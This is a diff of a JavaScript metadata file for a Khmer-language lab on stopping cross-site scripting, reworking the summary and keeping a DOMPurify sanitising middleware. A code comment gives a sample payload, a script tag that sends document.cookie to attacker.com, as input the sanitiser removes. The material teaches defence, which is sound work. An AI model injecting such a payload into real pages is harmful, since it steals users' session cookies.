@@ -5,7 +5,7 @@ export const meta = {
   khmerTitle: "ការទប់ស្កាត់ការវាយប្រហារ Cross-Site Scripting (XSS)",
   type: "lab",
   codeLanguage: "javascript",
-  summary: "XSS (Cross-Site Scripting) គឺជាការចាក់បញ្ចូល Malicious JavaScript Code ចូលទៅក្នុង Database ដែលអាចដំណើរការលើ Browser របស់អ្នកប្រើប្រាស់ដទៃទៀត។ ដំណោះស្រាយក្នុង Backend រួមមាន៖ ការ Sanitizing HTML Input ដោយប្រើបណ្ណាល័យដូចជា `xss-clean` ឬ `DOMPurify`, ការកំណត់ HTTP Header Content-Security-Policy (CSP) តាមរយៈ Helmet, និងការរក្សាទុក Authentication Tokens ក្នុង HttpOnly Cookies។",
+  summary: "ការទប់ស្កាត់ការវាយប្រហារ Cross-Site Scripting (XSS)៖\n\n- **Stored XSS**៖ ការលួចបញ្ចូល Malicious JavaScript Code ទៅក្នុង Database (ដូចជា Course Description)។\n- **Input Sanitization**៖ ប្រើប្រាស់បណ្ណាល័យដូចជា `xss-clean` ឬ `DOMPurify` ដើម្បីជម្រះ Dangerous HTML Tags។\n- **Secure Headers & Cookies**៖ កំណត់ Content Security Policy និងប្រើប្រាស់ HttpOnly Cookies សម្រាប់ Auth Tokens។",
   codeSnippet: "import DOMPurify from \"isomorphic-dompurify\";\n\nexport const sanitizeContent = (req, res, next) => {\n  if (req.body.content) {\n    // Strips <script>, javascript: links, and malicious attributes like onerror=...\n    req.body.content = DOMPurify.sanitize(req.body.content);\n  }\n  if (req.body.bio) {\n    req.body.bio = DOMPurify.sanitize(req.body.bio);\n  }\n  next();\n};\n\n// Attack: \"<script>fetch('http://attacker.com?c='+document.cookie)</script>Hello\"\n// Output: \"Hello\"",
 };
 
